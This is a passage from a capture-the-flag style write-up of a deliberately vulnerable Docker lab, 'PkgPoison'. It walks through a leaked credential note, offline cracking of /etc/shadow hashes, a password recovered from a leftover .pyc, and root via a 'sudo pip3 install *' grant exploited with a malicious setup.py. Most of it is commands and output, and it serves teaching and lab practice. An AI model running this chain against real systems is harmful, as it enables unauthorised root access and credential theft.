@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 162 PkgPoison &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; PkgPoison</p><h1 id="162-pkgpoison--dockerlabs-writeup">162 PkgPoison — DockerLabs Writeup</h1>
+<p><strong>Target:</strong> <code>[net-0-6]</code> (container <code>pkgpoison_container</code>, image <code>pkgpoison:latest</code>, HOSTNAME <code>84dbffed895e</code>)
+<strong>Date:</strong> 2026-10-01
+<strong>Outcome:</strong> Privilege escalation to <strong><code>uid=0</code> / <code>euid=0</code></strong>, measured from inside the process and read back from outside the container over HTTP. Four rungs, four identities. <strong>No <code>FLAG{}</code></strong> — measured absence, 17,577 files / 500,149,523 bytes / 6 patterns / 0 hits, positive control green.</p>
+<p><strong>Catalogue entry:</strong> <em>&quot;Intrusión sencilla y escalada de privilegios mediante distintos pasos.&quot;</em></p>
+<hr />
+<h2 id="0-the-direct-answer-is-this-a-supply-chain-lab">0. The direct answer: is this a supply-chain lab?</h2>
+<p><strong>Yes — and not as a decoy.</strong> The name is correct about the class, and wrong about
+almost everything else. Read plainly:</p>
+<blockquote>
+<p><strong>An attacker who controls <em>what gets installed</em> does not need a vulnerability in
+the application.</strong> Here there is no application at all — no PHP, no CMS, no
+framework, no <code>mod_php</code>, no database, three files and one subdirectory in the docroot. <strong>The boundary is
+drawn at whatever decides the version</strong>, and in this lab that boundary is a single
+<code>sudoers</code> wildcard.</p>
+</blockquote>
+<p>The evidence is one 50-byte file, quoted verbatim (<code>od -c</code>, mode <code>644 root:root</code>,
+50 bytes, <strong>not owned by any dpkg package</strong> — <code>dpkg -S</code> → <code>no path found matching pattern</code>):</p>
+<pre><code>/etc/sudoers.d/001-admin-task
+admin ALL=(ALL) NOPASSWD: /usr/bin/pip3 install *
+0000000   a   d   m   i   n       A   L   L   =   (   A   L   L   )
+0000020   N   O   P   A   S   S   W   D   :       /   u   s   r   /   b
+0000040   i   n   /   p   i   p   3       i   n   s   t   a   l   l
+0000060   *  \n
+</code></pre>
+<p><code>sudo -l</code>, read as <code>admin</code>, agrees:</p>
+<pre><code>User admin may run the following commands on 84dbffed895e:
+    (ALL) NOPASSWD: /usr/bin/pip3 install *
+</code></pre>
+<p><strong>What the package mechanism actually is.</strong> Before answering, I established it,
+because the brief asked and because the corpus's standing finding is that a class
+label is a filename, not a fingerprint:</p>
+<table>
+<thead>
+<tr>
+<th>Question asked of the artefact</th>
+<th>Answer</th>
+<th>How</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Is there an application dependency?</td>
+<td><strong>No</strong></td>
+<td>docroot is 3 entries + 1 subdir: <code>index.html</code> 589 B, <code>index.png</code> 1,557,421 B, <code>notes/note.txt</code> 177 B. <code>ls /etc/apache2/mods-enabled/</code> — 27 entries, <strong>no <code>php*</code></strong>, no <code>cgi</code></td>
+</tr>
+<tr>
+<td>Is there a package manager?</td>
+<td><strong>Yes, the system one</strong></td>
+<td><code>dpkg -s python3-pip</code> → <code>Version: 20.0.2-5ubuntu1.11</code>; <code>/usr/lib/python3/dist-packages/pip-20.0.2.egg-info</code>; <code>pip3 --version</code> → <code>pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8)</code></td>
+</tr>
+<tr>
+<td>A lockfile?</td>
+<td><strong>No</strong></td>
+<td><code>find / -xdev</code> for <code>package.json</code>, <code>package-lock.json</code>, <code>yarn.lock</code>, <code>requirements.txt</code>, <code>Pipfile*</code>, <code>poetry.lock</code>, <code>composer.json</code>, <code>composer.lock</code>, <code>Gemfile*</code>, <code>go.mod</code>, <code>Cargo.toml</code>, <code>*.whl</code>, <code>*.egg-info</code>, <code>vendor</code>, <code>node_modules</code> → 28 <code>.whl</code> + 11 <code>.egg-info</code>, <strong>all of them the stock Ubuntu base image</strong> (<code>/usr/share/python-wheels/</code>, <code>/usr/lib/python3/dist-packages/</code>). <strong>Zero</strong> hits in <code>/opt</code>, <code>/var/www</code>, <code>/srv</code>, <code>/home</code>, <code>/usr/local</code></td>
+</tr>
+<tr>
+<td>A vendored dependency?</td>
+<td><strong>No</strong></td>
+<td>as above</td>
+</tr>
+<tr>
+<td>A build step that installs something?</td>
+<td><strong>No Dockerfile to read</strong></td>
+<td><code>docker history --no-trunc pkgpoison:latest</code> → <strong>exactly one line</strong>, <code>sha256:9ec88646ca1b… 16 months ago 571MB Imported from -</code>. Unlike lab 188 there is no layer record to read; the squash destroyed it</td>
+</tr>
+<tr>
+<td>A registry reference?</td>
+<td><strong>Yes, and it is the bug</strong></td>
+<td>the registry the installer is pointed at is chosen by the <em>caller</em>, because the argument specification is <code>install *</code></td>
+</tr>
+</tbody>
+</table>
+<p>So: the package mechanism present is <strong><code>pip</code> on the host</strong>, and the attack surface is
+<strong>the install path itself</strong>, delegated to root by a policy line. This is not
+dependency confusion (a name an attacker can register); the attacker here does not
+need a registry at all, because the wildcard lets them hand the installer an
+arbitrary local path.</p>
+<p><strong>Cross-read, as the brief requires.</strong> Lab 281 (PipePwned) is the nearest sibling and
+it is a <em>different</em> class: there, a root daemon polls <code>/opt/ci/builds/*.sh</code>, a
+group-writable directory, so the attacker authors the job. Here there is <strong>no daemon
+and no attacker-authored file on any build path</strong> — the delegation is a <code>sudoers</code>
+argument specification, and the thing the caller controls is <strong>which artifact the
+installer resolves and executes</strong>, not a file the runner will pick up. Lab 93 named
+an interpreter with no argument list; lab 282 showed a grant that pins <em>both</em>
+arguments (9 forms, 8 denied). <strong>Lab 162 is the fourth data point and it agrees with
+282: the discriminator is the argument specification.</strong> <code>install *</code> leaves the
+requirement specifier — the version selector — entirely to the caller.</p>
+<p>A search of the 58 existing writeups for this class:</p>
+<pre><code>'pip install' / 'pip3 install'   -&gt; 0 writeups
+'dependency confusion'           -&gt; 0
+'confusión de dependencias'      -&gt; 0
+'version selector'              -&gt; 0
+</code></pre>
+<p><strong>The class is absent from the corpus.</strong> Not extended: new.</p>
+<hr />
+<h2 id="1-deploy">1. Deploy</h2>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Fetch</td>
+<td>already verified: <code>[lab-home]/dockerlabs/state/162.ok</code>; <code>dist/pkgpoison.zip</code> 163.7M</td>
+</tr>
+<tr>
+<td>Extract</td>
+<td><code>env DL_ROOT=[lab-home]/dockerlabs tooling/download-labs.sh extract 162</code> → <code>labs/162/</code> = <code>pkgpoison.tar</code> (165.6M) + <code>auto_deploy.sh</code> (5.1K)</td>
+</tr>
+<tr>
+<td>Image</td>
+<td><code>docker load -i pkgpoison.tar</code> → <code>Loaded image: pkgpoison:latest</code>, <code>9ec88646ca1b</code>, 1.11GB (535MB compressed)</td>
+</tr>
+<tr>
+<td>Run</td>
+<td><code>docker run -d --name pkgpoison_container pkgpoison:latest</code> → <code>[net-0-6]</code>, HOSTNAME <code>84dbffed895e</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>auto_deploy.sh</code> was <strong>read, not run</strong> (it ends in <code>while true; do sleep 1; done</code>,
+line 145). It describes a <strong>single-container, single-<code>docker run -d</code>, default-bridge</strong>
+topology — no networks, no macvlan, no second host. That matched what I got.</p>
+<p><code>/etc/entrypoint.sh</code>, in full:</p>
+<pre><code class="language-bash">#!/bin/bash
+service ssh start
+service apache2 start
+tail -f /dev/null
+</code></pre>
+<p><strong>Note the entrypoint is not the vulnerability and does not contain one.</strong> Reading it
+first cost ten seconds and produced the whole architecture: two services, no
+supervisor, no database, no application server. That is §3 of the RUNBOOK paying for
+itself.</p>
+<hr />
+<h2 id="2-versions-from-version-bearing-files-only">2. Versions, from version-bearing files only</h2>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Version</th>
+<th>Source (read, not recalled)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Ubuntu 20.04.6 LTS (Focal Fossa)</td>
+<td><code>/etc/os-release</code> <code>PRETTY_NAME=&quot;Ubuntu 20.04.6 LTS&quot;</code></td>
+</tr>
+<tr>
+<td>Web</td>
+<td>Apache httpd <strong>2.4.41-4ubuntu3.23</strong></td>
+<td><code>dpkg -s apache2</code> → <code>Version:</code></td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>OpenSSH <strong>1:8.2p1-4ubuntu0.13</strong></td>
+<td><code>dpkg -s openssh-server</code> → <code>Version:</code></td>
+</tr>
+<tr>
+<td>sudo</td>
+<td><strong>1.8.31-1ubuntu1.5</strong></td>
+<td><code>dpkg -s sudo</code> → <code>Version:</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><strong>3.8.10</strong></td>
+<td><code>python3 -V</code></td>
+</tr>
+<tr>
+<td>pip</td>
+<td><strong>20.0.2-5ubuntu1.11</strong></td>
+<td><code>dpkg -s python3-pip</code>; corroborated by <code>pip-20.0.2.egg-info</code> and <code>pip3 --version</code></td>
+</tr>
+<tr>
+<td>setuptools</td>
+<td>45.2.0-1ubuntu0.2</td>
+<td><code>dpkg -s python3-setuptools</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>nmap -sV</code> agrees with the artefact on both services, which is the point — the versions
+in this table came from <code>dpkg</code>, and the scanner only confirmed them.</p>
+<hr />
+<h2 id="3-surface">3. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-6]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Not shown: 65533 closed tcp ports (conn-refused)
+</code></pre>
+<p><strong>UDP, measured rather than assumed</strong> (<code>nmap -sU</code> refused: <em>You requested a scan type
+which requires root privileges</em>), so the second instrument was the kernel's own table:</p>
+<pre><code>$ cat /proc/net/udp      →  1 line (header only)
+$ cat /proc/net/udp6     →  1 line (header only)
+</code></pre>
+<p><strong>0 UDP sockets.</strong> The absent class is measured, not blind.</p>
+<p>Docroot, complete:</p>
+<pre><code>$ ls -la /var/www/html
+-rw-r--r-- 1 www-data www-data     589 May 20  2025 index.html
+-rw-r--r-- 1 www-data www-data 1557421 May 20  2025 index.png
+drwxr-xr-x 2 www-data www-data    4096 May 20  2025 notes
+$ ls -la /var/www/html/notes
+-rw-r--r-- 1 www-data www-data     177 May 20  2025 note.txt
+</code></pre>
+<p><code>index.png</code> was checked for a hidden channel and has none: valid PNG, 1024×1024,
+<code>IEND</code> at offset 1,557,413, <strong>−4 bytes</strong> of trailing data (i.e. <code>IEND</code> + CRC is the
+last 8 bytes and there is nothing after it), <strong>no <code>tEXt</code>/<code>iTXt</code>/<code>zTXt</code> chunk</strong>. Its
+content is a wireframe mock-up of <code>index.html</code> (&quot;What are you looking for?&quot;).</p>
+<p>Everything on the box that the lab author touched, found by mtime and not by guessing:</p>
+<pre><code>$ find / -xdev -newermt 2025-05-16 ! -newermt 2025-05-26 -type f | grep -vE '^/(usr|etc|var/lib|var/cache|var/log|snap)'
+/var/www/html/index.png
+/var/www/html/index.html
+/var/www/html/notes/note.txt
+/run/sudo/ts/dev
+/run/motd.dynamic
+/run/utmp
+/run/systemd/resolve/stub-resolv.conf
+/opt/scripts/__pycache__/secret.cpython-38.pyc
+/root/.bash_history
+[lab-home]/dev/.bash_history
+[lab-home]/admin/.bash_history
+</code></pre>
+<p><strong>9 files outside the stock package set, and that list is the whole lab.</strong> Two accounts
+with shells, no others:</p>
+<pre><code>$ grep -E 'bash$' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+dev:x:1000:1000::[lab-home]/dev:/bin/bash
+admin:x:1001:1001::[lab-home]/admin:/bin/bash
+</code></pre>
+<hr />
+<h2 id="4-chain">4. Chain</h2>
+<p>Every rung carries the identity the brief demands, quoted from the process itself.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof (verbatim)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>anonymous</td>
+<td><code>GET /notes/note.txt</code> — credential-shaped string in a world-readable file in the docroot</td>
+<td><code>HTTP/1.1 200 OK</code>, <code>Content-Length: 177</code>. Control: <code>GET /notes/nosuchfile-dl162</code> → <code>404</code>, <code>272</code> bytes</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>dev</code></td>
+<td><strong>the published credential does not work</strong>; <code>dev</code>'s real password recovered offline against the yescrypt hash in <code>/etc/shadow</code></td>
+<td><code>uid=1000(dev) gid=1000(dev) groups=1000(dev)</code>; <code>/proc/self/status</code> → <code>Uid: 1000 1000 1000 1000</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>admin</code></td>
+<td><code>strings -a</code> on a <strong>world-readable <code>.pyc</code> whose <code>.py</code> the author deleted</strong></td>
+<td><code>uid=1001(admin) gid=1001(admin) groups=1001(admin)</code>; <code>Uid: 1001 1001 1001 1001</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>root</td>
+<td><code>sudo -n /usr/bin/pip3 install &lt;path&gt;</code> — the grant's wildcard hands the caller the <strong>requirement specifier</strong></td>
+<td><code>getuid: 0</code>, <code>geteuid: 0</code>, <code>getgid: 0</code>, <code>getegid: 0</code>, <code>Uid: 0 0 0 0</code>, <code>Gid: 0 0 0 0</code>, <code>SUDO_USER: admin</code>, <code>SUDO_UID: 1001</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="rung-0--the-leak-and-an-impossible-name-control">Rung 0 — the leak, and an impossible-name control</h3>
+<pre><code>$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://[net-0-6]/notes/note.txt
+200 177
+
+Dear developer,
+Please remember to change your credentials &quot;dev:developer123&quot; to something stronger.
+I've already warned you that weak passwords can get us compromised.
+
+-Admin
+</code></pre>
+<p>Control, run before the leak is read as a credential:</p>
+<pre><code>$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://[net-0-6]/notes/nosuchfile-dl162
+404 272
+</code></pre>
+<p>Two different answers, so the 200 is a real document and not a catch-all.</p>
+<h3 id="rung-1--the-published-credential-is-dead-and-saying-so-is-a-finding">Rung 1 — the published credential is dead, and saying so is a finding</h3>
+<p><code>dev:developer123</code> <strong>does not authenticate.</strong> Three independent instruments agree:</p>
+<pre><code># 1. paramiko (raw SSH password auth)
+paramiko.ssh_exception.AuthenticationException: Authentication failed.
+
+# 2. OpenSSH with a real pty — the client a human would use
+$ ssh -tt dev@[net-0-6] id
+dev@[net-0-6]'s password:
+Permission denied, please try again.
+
+# 3. the hash itself, read in place from /etc/shadow, no transcription
+dev hash_len 106 prefix $6$
+    'developer123' -&gt; no $6$YA2eCXQ1XxMyE8Bv$...
+    'p@$$w0r8321'   -&gt; no $6$YA2eCXQ1XxMyE8Bv$...
+    'dev'           -&gt; no $6$YA2eCXQ1XxMyE8Bv$...
+    'admin'         -&gt; no $6$YA2eCXQ1XxMyE8Bv$...
+admin hash_len 106 prefix $6$
+    'p@$$w0r8321'   -&gt; MATCH $6$NsbvfqygsGmZKnyK$...
+</code></pre>
+<p><code>crypt.crypt()</code> here is libxcrypt yescrypt on the target, and <strong>the same oracle
+returned MATCH for <code>admin</code> in the same run</strong> — so the negative for <code>dev</code> is a negative
+about the credential, not about the instrument.</p>
+<p>The real password for <code>dev</code> is <strong><code>computer</code></strong>, recovered offline. The oracle was
+proven green <strong>before</strong> the sweep was believed:</p>
+<pre><code>POSITIVE CONTROL: admin/p@$$w0r8321 -&gt; MATCH (oracle works)
+LIST /tmp/dl162.txt    candidates 24386  FOUND 'computer'
+LIST /tmp/dl162big.txt candidates 321373 FOUND 'computer'
+</code></pre>
+<p>Both lists independently returned the same string — 24,386 candidates in
+<code>sorted-passwords.txt</code> (101,074 lines) and 321,373 in <code>Passwords.txt</code> (517,506 lines),
+against <code>dev</code>'s <code>$6$</code> yescrypt hash. Rate measured on the target first: <strong>1,009
+hashes/s per process</strong>; 24,386 candidates is 24.2 s, 321,373 is 318.5 s. Each sweep
+<strong>aborted on the match</strong>, which is why the two candidate counts differ — they are
+positions in two different lists, not two sweeps of the same list. Confirmed by SSH:</p>
+<pre><code>$ ssh -tt dev@[net-0-6] 'id; grep -E &quot;^(Name|Uid|Gid|Groups)&quot; /proc/self/status'
+dev@[net-0-6]'s password: computer
+uid=1000(dev) gid=1000(dev) groups=1000(dev)
+dev
+Uid:	1000	1000	1000	1000
+Gid:	1000	1000	1000	1000
+Groups:	1000
+</code></pre>
+<p><strong>This is where the lab's advertised chain breaks.</strong> A solver who trusts the note
+never enters. That is Finding F4, and it is the lab's problem, not the testerisation's.</p>
+<h3 id="rung-2--a-deleted-py-and-the-pyc-that-outlived-it">Rung 2 — a deleted <code>.py</code>, and the <code>.pyc</code> that outlived it</h3>
+<pre><code>$ ls -l /opt/scripts/__pycache__/secret.cpython-38.pyc
+-rw-r--r-- 1 admin admin 274 May 24  2025 /opt/scripts/__pycache__/secret.cpython-38.pyc
+
+$ strings -a /opt/scripts/__pycache__/secret.cpython-38.pyc
+adminz
+p@$$w0r8321z
+Authenticating...)
+print)
+usernameZ
+passwordZ
+	secret.py	auth
+</code></pre>
+<p>Mode <code>644</code>, owner <code>admin</code>, in a <code>755</code> directory tree: <strong>readable by every identity on
+the box</strong>, including <code>dev</code>. <code>test -w</code> read as <code>dev</code> said <code>NOT-writable</code>, so it is a
+read, not a write primitive.</p>
+<p>The author left the receipts in <code>/root/.bash_history</code>, which is operator-side evidence
+about <em>how the lab was built</em> and is quoted as such (this is not how an attacker would
+learn it — the <code>.pyc</code> is world-readable):</p>
+<pre><code>$ cd /opt/scripts/
+vim secret.pu
+mv secret.pu secret.py
+python3 -m py_compile secret.py
+rm -rf __pycache__/
+rm secret.py
+vim secret.py
+python3 -m py_compile secret.py
+chown admin:admin /opt/scripts/__pycache__/secret.cpython-38.pyc
+chmod 644 /opt/scripts/__pycache__/secret.cpython-38.pyc
+…
+pip3 install uncompyle6
+</code></pre>
+<p><code>rm secret.py</code> <strong>twice</strong>, and the compiled artefact is still there, world-readable.
+The same history contains <code>pip3 install uncompyle6</code> — run by <strong>root, by the author,
+while building the lab</strong>. That is not the vulnerability; it is the class, sitting in
+the build history, one indentation level away from being it.</p>
+<p><code>admin</code>'s password was confirmed against its hash (<code>MATCH</code>, above) before it was used:</p>
+<pre><code>$ ssh -tt admin@[net-0-6] 'id; grep -E &quot;^(Name|Uid|Gid|Groups)&quot; /proc/self/status'
+admin@[net-0-6]'s password:
+uid=1001(admin) gid=1001(admin) groups=1001(admin)
+Uid:	1001	1001	1001	1001
+Gid:	1001	1001	1001	1001
+Groups:	1001
+</code></pre>
+<h3 id="rung-3--the-argument-specification-14-forms-measured">Rung 3 — the argument specification, 14 forms, measured</h3>
+<p>Per lab 282, the discriminator is the argument specification and not the fact that the
+named program is an interpreter. So I measured the specification instead of reading it
+out of <code>man 5 sudoers</code> — which is not installed on this image (<code>/usr/share/man/man5/</code>
+does not exist), a fact worth noting, because it means the man-page reading of a
+sudoers wildcard <strong>cannot be checked on the target</strong>.</p>
+<p>Positive control first, and it fired:</p>
+<pre><code>$ sudo -l                        # as admin
+User admin may run the following commands on 84dbffed895e:
+    (ALL) NOPASSWD: /usr/bin/pip3 install *
+</code></pre>
+<pre><code>=== FORM: sudo -n /usr/bin/pip3 install --help
+VERDICT[ALLOWED_BY_SUDOERS] rc=0  bytes=12638            &lt;- POSITIVE CONTROL, fired
+=== FORM: sudo -n /usr/bin/pip3
+sudo: a password is required
+VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
+=== FORM: sudo -n /usr/bin/pip3 list
+VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
+=== FORM: sudo -n /usr/bin/pip3 --version
+VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
+=== FORM: sudo -n /usr/bin/pip3 Install --help
+VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28            &lt;- case-sensitive
+=== FORM: sudo -n /usr/bin/pip3 uninstall setuptools
+VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
+=== FORM: sudo -n /usr/bin/pip3 download --help
+VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
+=== FORM: sudo -n /usr/bin/pip3 install -r /etc/hostname
+ERROR: Could not find a version that satisfies the requirement 84dbffed895e
+VERDICT[ALLOWED_BY_SUDOERS] rc=1  bytes=218              &lt;- '*' spans SPACES
+=== FORM: sudo -n /usr/bin/pip3 install ;id
+VERDICT[ALLOWED_BY_SUDOERS] rc=2  bytes=6274             &lt;- passed LITERALLY to pip
+=== FORM: sudo -n /usr/bin/pip3 install $IFS
+ERROR: Invalid requirement: '$IFS'
+VERDICT[ALLOWED_BY_SUDOERS] rc=1  bytes=34               &lt;- no shell, so no $IFS split
+=== FORM: sudo -n /usr/bin/pip3 install /dev/null
+VERDICT[ALLOWED_BY_SUDOERS] rc=2  bytes=3504
+=== FORM: sudo -n /bin/sh
+VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
+=== FORM: sudo -n /usr/bin/pip3 install --target /tmp/dl162_probe --help
+VERDICT[ALLOWED_BY_SUDOERS] rc=0  bytes=12638            &lt;- '*' spans SPACES
+</code></pre>
+<p><strong>14 forms: 6 allowed, 8 denied.</strong> Three measured properties of the specification, each
+with a form behind it:</p>
+<ol>
+<li><code>install</code> must be <strong>argv[1]</strong>, literally and case-sensitively. <code>list</code>, <code>--version</code>,
+<code>uninstall</code>, <code>download</code> and <code>Install</code> are all denied.</li>
+<li><code>*</code> matches <strong>the rest of the command line including spaces</strong> — proven by
+<code>install -r /etc/hostname</code> and <code>install --target /tmp/dl162_probe --help</code>, both
+allowed, neither of which is a single token.</li>
+<li><code>sudo</code> does <strong>not</strong> invoke a shell, so there is no metacharacter injection: <code>$IFS</code>
+reached pip as the six literal characters <code>$IFS</code> (<code>Invalid requirement: '$IFS'</code>).
+The exposure is not a shell. It is the specifier.</li>
+</ol>
+<h3 id="rung-4--root-with-the-payload-as-its-own-oracle">Rung 4 — root, with the payload as its own oracle</h3>
+<p><code>pip3 install</code> on a local path runs the project's <code>setup.py</code> <strong>as the installing
+identity</strong>. That vector has no output of its own, so the payload was built to write
+witnesses, and one of them was placed where the unprivileged identity provably cannot
+write.</p>
+<p>Pre-state, read as <code>admin</code>:</p>
+<pre><code>$ ls -la /root
+ls: cannot open directory '/root': Permission denied
+$ test -w /root &amp;&amp; echo WRITABLE || echo NOT
+/root NOT writable by admin
+</code></pre>
+<p>Then the grant:</p>
+<pre><code>$ sudo -n /usr/bin/pip3 install [lab-home]/admin/evilpkg
+Processing ./evilpkg
+Building wheel for dl162-probe (setup.py): started
+Building wheel for dl162-probe (setup.py): finished with status 'done'
+Successfully built dl162-probe
+Installing collected packages: dl162-probe
+Successfully installed dl162-probe-0.0.1
+rc=0
+</code></pre>
+<p><strong>Read back from outside the container</strong>, over HTTP, served by Apache as <code>www-data</code>:</p>
+<pre><code>$ curl -s http://[net-0-6]/dl162-proof-DL162-e7c41a9b.json
+{
+  &quot;token&quot;: &quot;DL162-e7c41a9b&quot;,
+  &quot;hostname&quot;: &quot;84dbffed895e&quot;,
+  &quot;getuid&quot;: 0,
+  &quot;geteuid&quot;: 0,
+  &quot;getgid&quot;: 0,
+  &quot;getegid&quot;: 0,
+  &quot;pid&quot;: 641,
+  &quot;ppid&quot;: 636,
+  &quot;cwd&quot;: &quot;/tmp/pip-req-build-9rd7y7l9&quot;,
+  &quot;argv&quot;: [
+    &quot;/tmp/pip-req-build-9rd7y7l9/setup.py&quot;,
+    &quot;egg_info&quot;,
+    &quot;--egg-base&quot;,
+    &quot;/tmp/pip-req-build-9rd7y7l9/pip-egg-info&quot;
+  ],
+  &quot;SUDO_USER&quot;: &quot;admin&quot;,
+  &quot;SUDO_UID&quot;: &quot;1001&quot;,
+  &quot;USER&quot;: &quot;root&quot;,
+  &quot;getpass.getuser()&quot;: &quot;root&quot;,
+  &quot;proc_self_status&quot;: [
+    &quot;Name:\tpython3&quot;,
+    &quot;Uid:\t0\t0\t0\t0&quot;,
+    &quot;Gid:\t0\t0\t0\t0&quot;,
+    &quot;Groups:\t0&quot;
+  ]
+}
+</code></pre>
+<p>Four things in that body earn their place:</p>
+<ul>
+<li><code>Uid: 0 0 0 0</code> and <code>Gid: 0 0 0 0</code> — <strong>real and effective are both 0</strong>. This is a
+genuine setuid-style transition, and the <em>pair</em> is reported, not the word &quot;root&quot;.</li>
+<li><code>SUDO_USER: admin</code>, <code>SUDO_UID: 1001</code> — the transition is attributable to this grant
+and this caller, not to anything else on the box.</li>
+<li><code>argv[0]</code> is <strong>inside a pip temp directory</strong>, <code>pip-req-build-*</code>, and <code>argv[1]</code> is
+<code>egg_info</code> — the payload did not run because I ran it. It ran because pip's build
+path executed it. That is what separates this from &quot;I wrote a script as root&quot;.</li>
+<li>the file is served by Apache as <code>www-data</code> and was created <code>root:root</code>, so the
+witness crosses the trust boundary and not merely a shell prompt.</li>
+</ul>
+<h3 id="the-differential-control--same-code-one-hop-apart">The differential control — same code, one hop apart</h3>
+<p>This is the pair that makes the finding a finding. Identical payload, unique token per
+run, both runs read back:</p>
+<table>
+<thead>
+<tr>
+<th>Run</th>
+<th><code>getuid</code></th>
+<th><code>geteuid</code></th>
+<th><code>SUDO_USER</code></th>
+<th>write <code>/root</code></th>
+<th>write <code>/var/www/html</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>A</strong> — unprivileged, <code>python3 setup.py egg_info</code></td>
+<td><strong>1001</strong></td>
+<td><strong>1001</strong></td>
+<td><code>null</code></td>
+<td><code>PermissionError</code></td>
+<td><code>PermissionError</code></td>
+</tr>
+<tr>
+<td><strong>B</strong> — <code>sudo -n /usr/bin/pip3 install …</code></td>
+<td><strong>0</strong></td>
+<td><strong>0</strong></td>
+<td><code>admin</code></td>
+<td><code>WROTE</code></td>
+<td><code>WROTE</code></td>
+</tr>
+</tbody>
+</table>
+<pre><code>=== CONTROL A: same code, UNPRIVILEGED, unique token ctr1790814565-713
+{ &quot;/root&quot;: &quot;FAILED on /root/dl162-ctr1790814565-713.json: PermissionError&quot;,
+  &quot;/var/www/html&quot;: &quot;FAILED on /var/www/html/dl162-ctr1790814565-713.json: PermissionError&quot;,
+  &quot;/tmp&quot;: &quot;WROTE /tmp/dl162-ctr1790814565-713.json&quot; }
+  &quot;getuid&quot;: 1001, &quot;geteuid&quot;: 1001, &quot;SUDO_USER&quot;: null,
+
+=== CONTROL B: same code, VIA THE SUDO GRANT, unique token ctr1790814565-713B
+--- what the root run recorded:
+  &quot;getuid&quot;: 0, &quot;geteuid&quot;: 0, &quot;getgid&quot;: 0, &quot;getegid&quot;: 0, &quot;SUDO_USER&quot;: admin,
+--- witness table written by the ROOT run:
+{ &quot;/root&quot;: &quot;WROTE …&quot;, &quot;/var/www/html&quot;: &quot;WROTE …&quot;, &quot;/tmp&quot;: &quot;WROTE …&quot; }
+</code></pre>
+<p>One class, two <code>id</code>s, one hop. Without row A the second row is a string.</p>
+<h3 id="the-artifact-form-not-just-the-directory-form">The artifact form, not just the directory form</h3>
+<p>The same grant, pointed at a distribution artifact from a repository <strong>the caller
+names</strong>, entirely on localhost — no third party touched:</p>
+<pre><code>### build the sdist as admin (uid 1001)
+-rw-rw-r-- 1 admin admin 1116 dl162reg-0.0.2.tar.gz
+
+### unprivileged baseline witness:
+  &quot;getuid&quot;: 1001, &quot;geteuid&quot;: 1001, &quot;SUDO_USER&quot;: null,
+
+### install THAT ARTIFACT through the grant, naming the repository
+$ sudo -n /usr/bin/pip3 install --no-index --find-links file://[lab-home]/admin/repo2 dl162reg
+  Building wheel for dl162reg (setup.py): finished with status 'done'
+  Stored in directory: /root/.cache/pip/wheels/69/15/c8/73e2c6cc968bd9e93a0bede306aa99ee57ae39810f604591d2
+Successfully built dl162reg
+Successfully installed dl162reg-0.0.2
+</code></pre>
+<p>Read back from outside:</p>
+<pre><code class="language-json">{ &quot;token&quot;: &quot;reg31790814946-874&quot;, &quot;version&quot;: &quot;0.0.2&quot;,
+  &quot;getuid&quot;: 0, &quot;geteuid&quot;: 0, &quot;pid&quot;: 899, &quot;cwd&quot;: &quot;/tmp/pip-install-lf487829/dl162reg&quot;,
+  &quot;argv&quot;: [&quot;/tmp/pip-install-lf487829/dl162reg/setup.py&quot;, &quot;bdist_wheel&quot;, &quot;-d&quot;, &quot;/tmp/pip-wheel-8ufftjd0&quot;],
+  &quot;SUDO_USER&quot;: &quot;admin&quot;,
+  &quot;status&quot;: [&quot;Uid:\t0\t0\t0\t0&quot;, &quot;Gid:\t0\t0\t0\t0&quot;] }
+</code></pre>
+<p><code>pip</code> fetched, unpacked and executed build code out of an archive the caller supplied
+from an index the caller supplied. <code>--index-url</code> is accepted at the sudoers layer too
+(<code>Looking in indexes: http://127.0.0.1:9/simple/</code> — sudo allowed it; pip failed on
+the connection, which is a pip outcome, not a sudo outcome).</p>
+<h3 id="persistent-root-owned-residue">Persistent root-owned residue</h3>
+<p>Two artefacts survive the session and are root-owned, which is the part an operator
+would actually have to clean up:</p>
+<pre><code>drwxr-sr-x 2 root staff 4096 /usr/local/lib/python3.8/dist-packages/dl162_probe-0.0.1.dist-info
